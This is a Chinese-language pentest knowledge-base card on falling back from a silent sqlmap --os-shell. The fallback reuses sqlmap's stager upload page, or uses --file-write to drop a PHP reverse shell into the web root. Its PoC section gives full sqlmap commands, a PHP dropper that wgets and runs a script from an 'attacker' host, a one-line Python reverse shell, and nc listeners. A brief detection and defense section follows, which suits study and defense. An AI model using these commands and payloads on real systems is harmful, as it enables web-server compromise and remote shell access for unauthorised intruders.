---
id: tools-sqlmap-os-shell-stager-upload-file-write-webshell-fallback
title: sqlmap --os-shell 后门上传成功但命令不回显时的兜底：复用 stager 上传链接或 --file-write 投递 php-reverse-shell / 下载执行脚本
type: scenario
domain: tools
path: tools
technique: sqlmap-os-shell-stager-file-write-fallback
tags:
- sqlmap
- os-shell
- file-write
- file-stager
- sqli
- webshell
- reverse-shell
- tooling
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V619
  verified_at: '2026-11-12T21:09:47+08:00'
  notes: 已对照原文与全部19张截图核对：img05 显示 stager 上传成功(/var/www/tmpuzpqg.php 后门上传链接)、后门 tmpbnvzz.php 上传成功，os-shell> id 两次均 No output，与卡内前提一致；img06 nc -lvnp 443 收到 www-data，对应 --file-write php-reverse-shell443.php 至 /var/www；img07 完整 get2255.php 链（sqlmap --file-write 写 /var/www/get2255.php → python3 http.server 9000 托管 shell2255.py → nc 2255 收 www-data）；img03/04/09 的 login.php email 注入与 sqlmap 8 列 UNION 为背景。--os-shell/-u/--data/--level=5 --risk=3 命令行与原文一致。小差异（不构成错误）：原文正文写 stager/后门文件名为 /tmpuouvt.php、/tmpbljfd.php，而 img05 截图为 /var/www/tmpuzpqg.php、/var/www/tmpbnvzz.php（不同次运行），卡内以“如”举例、不误导。affected_versions 留空正确（原文未标注 sqlmap 版本）。dedup：duplicate=1 为自身，related=1 为 pentest-c2-os-shell-echo-chunked-certutil-decode-payload-drop（os-shell 可执行但受限时的 C2 投递，场景不同），web-generic-sqli-mysql-outfile-general-log-webshell 为手工 INTO OUTFILE/general_log 写 shell，均非同链；全库仅此一张 sqlmap os-shell 卡，dup-scan 无本卡 pair；tools 根目录已有 apktool/jadx/yakit 单工具卡，路径合法。未执行 PoC。
url: /docs/tools/tools-sqlmap-os-shell-stager-upload-file-write-webshell-fallback/
draft: false
kb_aliases:
- sqlmap os-shell 无回显
- sqlmap 后门上传链接
- sqlmap --file-write 写 shell
- sqlmap stager 复用
- sqlmap 上传 php-reverse-shell
- get2255.php wget 反弹 shell
---

## 一句话结论

`sqlmap --os-shell` 显示 file stager 与后门都已上传成功（输出里有形如 `http://target/tmpXXXX.php` 的上传链接），但输入命令只返回 `No output` 时，不必死磕 os-shell：该 stager 本身就是 Web 服务器上一个可用的文件上传端点，可以直接上传自己的 PHP shell；或者改用 `--file-write=<本地shell> --file-dest=<Web可写目录>` 把 php-reverse-shell 写进站点目录，再让目标 `wget` 下载执行一个 Python 反弹 shell 脚本，绕开 os-shell 的命令执行封装。

## 原理

- **os-shell 的构成**：sqlmap 的 os-shell 需要先上传一个 file stager（负责接收后续文件），再上传一个带命令执行逻辑的后门，然后把“命令”包装成后门能理解的请求。最终执行依赖后门里的 `system/exec` 等函数以及数据库账号/Web 用户对目录的写权限。
- **为什么会出现“上传成功但不回显”**：stager 与后门的上传只需要文件写权限；而命令执行还依赖 `disable_functions`、`open_basedir`、SELinux/AppArmor、Web 用户与数据库用户权限差异、后端过滤等条件。任一条不满足，就会表现为后门可访问、`--os-shell` 却一直 `No output`。此时 **文件写入能力仍然有效**，这是兜底的立足点。
- **复用 stager 上传链接**：sqlmap 打印的 `http://target/tmpXXXX.php` 是 stager 的 Web 入口，页面上有文件选择与目标目录输入框（sqlmap file uploader），本质上就是一个匿名上传接口；用它上传任意 PHP 文件，与 os-shell 的命令执行是否可用无关。
- **`--file-write` 的机制**：sqlmap 用数据库的 `INTO OUTFILE/DUMPFILE` 等文件写能力把本地文件内容写到 `--file-dest` 指定路径，要求数据库账号有 `FILE` 权限、`secure_file_priv` 允许写该目录、且目标目录对数据库进程可写。写进 Web 根目录后，浏览器访问即执行。
- **为什么要 `wget` 二次下载**：php-reverse-shell 这类脚本较长，直接 `INTO OUTFILE` 写长内容时容易被引号/转义/长度限制破坏；先写一个极短的 `<?php system('wget ...; chmod +x; ./shell.py');?>` 取壳器，再由目标主动下载真正的反弹 shell 脚本，可显著降低写入失败率；目标需要能出网访问攻击机的 HTTP 服务。

## 触发条件

- 存在可利用的 SQL 注入，且数据库账号具备文件写权限（MySQL `FILE`，`secure_file_priv` 非 `NULL` 且允许目标目录）。
- Web 服务与数据库可写同一目录，或已知可写且可访问的 Web 路径（目录扫描/目录列表/报错泄露）。
- `--os-shell` 的 stager 上传成功（输出含上传链接），但命令执行无回显/不执行。
- 目标可回连攻击机（反弹 shell），或能从攻击机 HTTP 服务 `wget` 下载脚本。

## 利用步骤

1. 先用 sqlmap 打通注入并尝试 os-shell：`sqlmap -u '<url>' --data='<post>' --level=5 --risk=3 --os-shell`；记录输出里的 stager 上传链接与后门链接（如 `/tmpuouvt.php`、`/tmpbljfd.php`）。
2. 若 `os-shell> id` 只返回 `No output`，不要继续等待：确认 stager 链接可访问，页面即 sqlmap file uploader（可选文件 + 目标目录 `/var/www/`）。
3. 准备 `php-reverse-shell443.php`（监听端口改成 443），启动 `nc -lvnp 443`，用 `--file-write` 写入 Web 目录：
   `--file-write='/path/php-reverse-shell443.php' --file-dest='/var/www/php-reverse-shell443.php'`，浏览器访问该文件即可收到 `www-data` shell。
4. 备选（短取壳器）：本地写 `get2255.php`，内容为 `<?php system('cd /tmp;wget http://attacker:9000/shell2255.py;chmod +x shell2255.py;./shell2255.py');?>`；用 `--file-write` 或 stager 上传到 `/var/www/get2255.php`。
5. 攻击机启动 `python3 -m http.server 9000` 托管 `shell2255.py`（Python 反弹 shell 一行），同时 `nc -lvnp 2255`；浏览器访问 `/get2255.php`，目标 wget 下载并执行脚本，监听端收到 shell。
6. 验证身份（`id`、`hostname`），再进入提权信息收集；注意清理上传的临时文件与 stager/后门。

## PoC

```bash
# 1) sqlmap 尝试 os-shell（失败时保留 --file-write 能力）
sqlmap -u 'http://target/login.php' --data='email=admin&pass=admin&submit=Login' \
  --level=5 --risk=3 --os-shell

# 2) 方式 A：直接写 php-reverse-shell 到 Web 目录（本地文件里把监听 IP/端口改成 attacker:443）
sqlmap -u 'http://target/login.php' --data='email=admin&pass=admin&submit=Login' \
  --level=5 --risk=3 \
  --file-write='/home/attacker/php-reverse-shell443.php' \
  --file-dest='/var/www/php-reverse-shell443.php'

nc -lvnp 443
# 浏览器访问 http://target/php-reverse-shell443.php

# 3) 方式 B：写一个短取壳器，由目标 wget 下载并执行 Python 反弹 shell
cat > get2255.php <<'EOF'
<?php system('cd /tmp;wget http://attacker:9000/shell2255.py;chmod +x shell2255.py;./shell2255.py');?>
EOF
sqlmap -u 'http://target/login.php' --data='email=admin&pass=admin&submit=Login' \
  --file-write='/home/attacker/get2255.php' --file-dest='/var/www/get2255.php'

# shell2255.py 内容（一行 Python 反弹 shell）
# export RHOST="attacker";export RPORT=2255;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

python3 -m http.server 9000
nc -lvnp 2255
# 浏览器访问 http://target/get2255.php
```

说明：PoC 为靶场链路的结构化复现，未在本机执行；仅用于授权测试，`php-reverse-shell` 请使用本地副本并修改回连地址。

## 变体与关联

- **写入方式变体**：`--file-write` 依赖 `INTO OUTFILE/DUMPFILE`；若被 `secure_file_priv` 或权限限制，可改用 `general_log`/`slow_query_log` 落盘（见 [[web-generic-sqli-mysql-outfile-general-log-webshell]]）。
- **os-shell 可执行但环境受限**：若命令能执行但无法出网，可用 echo 分块 + certutil 投递 C2（见 [[pentest-c2-os-shell-echo-chunked-certutil-decode-payload-drop]]）。
- **数据库本地提权**：拿到数据库超级用户后，可 `DUMPFILE` 写 UDF 并 `create function sys_eval` 提权（见 [[pentest-privilege-escalation-mysql-udf-dumpfile-root]]）。
- **边界**：数据库与 Web 分离、无共享可写目录、`disable_functions` 禁用 `system/exec`、或出入站全被封禁时，本条兜底失效，需要改为 `load_file` 读源码找其他入口或走其它通道。

## 检测与防御

- **检测**：Web 目录出现 `tmpXXXX.php`、`php-reverse-shell*.php`、`get2255.php` 等异常文件；访问日志出现 stager 上传页面与随后对同一目录新文件的访问；数据库日志出现 `INTO OUTFILE/DUMPFILE` 写入请求；Web 进程发起 `wget`/外连。
- **防御**：数据库账号最小权限，业务账号撤销 `FILE`；`secure_file_priv=NULL` 或限制到专用目录；Web 根目录对数据库用户不可写；`disable_functions` 禁用命令执行函数并启用 `open_basedir`；出站流量白名单与文件完整性监控。
- **加固**：WAF 拦截 sqlmap 特征（UA、stager 文件名、常见后门参数）；上传目录禁止执行 PHP；定期扫描 Web 目录新增可执行文件。
